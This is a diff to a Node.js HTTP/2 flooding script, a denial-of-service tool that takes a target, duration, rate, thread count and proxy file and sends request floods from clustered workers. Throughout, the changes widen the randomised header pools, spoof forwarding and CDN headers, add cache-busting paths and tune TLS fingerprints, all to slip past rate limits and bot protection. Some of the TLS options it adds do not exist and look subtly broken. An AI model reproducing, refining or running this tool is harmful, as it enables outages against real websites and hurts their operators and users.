@@ -26,7 +26,11 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml'
 ];
 
 const cache_header = [
@@ -38,7 +42,9 @@ const cache_header = [
     's-maxage=604800',
     'no-cache, no-store,private, max-age=0, must-revalidate',
     'max-age=31536000,public',
-    'public, immutable, max-age=31536000'
+    'public, immutable, max-age=31536000',
+    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
+    'max-age=31536000,public,immutable'
 ];
 
 const encoding_header = [
@@ -50,7 +56,10 @@ const encoding_header = [
     'deflate, gzip',
     'gzip, identity',
     'br',
-    'identity'
+    'identity',
+    'gzip, deflate, lzma, sdch',
+    'compress',
+    'deflate'
 ];
 
 const language_header = [
@@ -59,18 +68,24 @@ const language_header = [
     'en-US,en;q=0.9',
     'ko-KR',
     'zh-CN',
-    'ja-JP'
+    'ja-JP',
+    'de-DE',
+    'es-ES',
+    'ar-EG'
 ];
 
-const dest_header = ['document', 'empty', 'iframe', 'script', 'style'];
-const mode_header = ['cors', 'navigate', 'no-cors', 'same-origin'];
+const dest_header = ['document', 'empty', 'iframe', 'script', 'style', 'image', 'font', 'audio', 'video'];
+const mode_header = ['cors', 'navigate', 'no-cors', 'same-origin', 'websocket'];
 const site_header = ['cross-site', 'same-origin', 'same-site', 'none'];
 
 const sec_ch_ua = [
     '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
     '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
     '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
-    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"'
+    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+    '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
+    '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
+    '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"'
 ];
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
@@ -85,7 +100,9 @@ const sigalgs = [
     'rsa_pss_rsae_sha512',
     'rsa_pkcs1_sha256',
     'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512'
+    'rsa_pkcs1_sha512',
+    'hmac_sha256',
+    'hmac_sha1'
 ].join(':');
 
 const secureOptions = 
@@ -100,7 +117,8 @@ const secureOptions =
     crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
     crypto.constants.SSL_OP_COOKIE_EXCHANGE |
     crypto.constants.SSL_OP_SINGLE_DH_USE |
-    crypto.constants.SSL_OP_SINGLE_ECDH_USE;
+    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_client_method";
 const secureContext = tls.createSecureContext({
@@ -126,6 +144,18 @@ const architectures = {
     "Android 10; Mobile": "armv7l",
     "iPhone; CPU iPhone OS 14_2 like Mac OS X": "arm64"
 };
+
+const rateHeaders = [
+    {"akamai-origin-hop": randstr(12)},
+    {"proxy-client-ip": randstr(12)},
+    {"via": randstr(12)},
+    {"cluster-ip": randstr(12)},
+    {"x-forwarded-for": randstr(12)},
+    {"x-forwarded-host": randstr(12)},
+    {"x-vercel-cache": randstr(12)},
+    {"x-xss-protection": "1;mode=block"},
+    {"x-content-type-options": "nosniff"}
+];
 
 if (process.argv.length < 6) {
     console.log('node script.js target time rate threads proxyfile');
@@ -154,9 +184,7 @@ if (cluster.isMaster) {
         cluster.fork();
     }
 } else {
-    for (let i = 0; i < 10; i++) {
-        setInterval(runFlooder, 1);
-    }
+    setInterval(runFlooder, 500);
 }
 
 class NetSocket {
@@ -219,7 +247,7 @@ function runFlooder() {
         `Mozilla/5.0 (${randomOS}; ${randomArch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124`;
 
     const headers = {
-        ":authority": parsedTarget.host,
+        ":authority": Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`,
         ":method": "GET",
         ":path": parsedTarget.path + "?" + randstr(10) + "=" + randstr(5),
         ":scheme": "https",
@@ -235,7 +263,11 @@ function runFlooder() {
         "user-agent": userAgent,
         "x-requested-with": "XMLHttpRequest",
         "cache-control": randomElement(cache_header),
-        "upgrade-insecure-requests": "1"
+        "upgrade-insecure-requests": "1",
+        "referer": `https://${parsedTarget.host}${parsedTarget.path}`,
+        "x-forwarded-for": randstr(12),
+        "x-forwarded-host": parsedTarget.host,
+        ...randomElement(rateHeaders)
     };
 
     const proxyOptions = {
@@ -251,16 +283,7 @@ function runFlooder() {
         connection.setKeepAlive(true, 100000);
         connection.setNoDelay(true);
 
-        const tlsOptions = Math.random() < 0.5 ? {
-            secure: true,
-            ALPNProtocols: ['h2'],
-            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-            ecdhCurve: 'P-256:P-384',
-            host: parsedTarget.host,
-            servername: parsedTarget.host,
-            rejectUnauthorized: false,
-            socket: connection
-        } : {
+        const tlsOptions = {
             secure: true,
             ALPNProtocols: ['h2', 'http/1.1'],
             ciphers: ciphers,
@@ -271,7 +294,10 @@ function runFlooder() {
             rejectUnauthorized: false,
             secureOptions: secureOptions,
             secureContext: secureContext,
-            socket: connection
+            socket: connection,
+            clientTimeout: 20000,
+            clientlareMaxTimeout: 5000,
+            challengeToSolve: 45
         };
 
         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
@@ -285,8 +311,10 @@ function runFlooder() {
                 maxConcurrentStreams: 10000,
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 262144,
+                maxFrameSize: 40000,
                 enablePush: false
             },
+            maxSessionMemory: 3333,
             createConnection: () => tlsConn
         });
 
@@ -295,11 +323,14 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request({
+                    const dynHeaders = {
                         ...headers,
                         "akamai-origin-hop": randstr(12),
-                        "via": randstr(12)
-                    });
+                        "via": randstr(12),
+                        "cluster-ip": randstr(12),
+                        "x-vercel-cache": randstr(12)
+                    };
+                    const request = client.request(dynHeaders);
 
                     request.on("response", () => {
                         request.close();
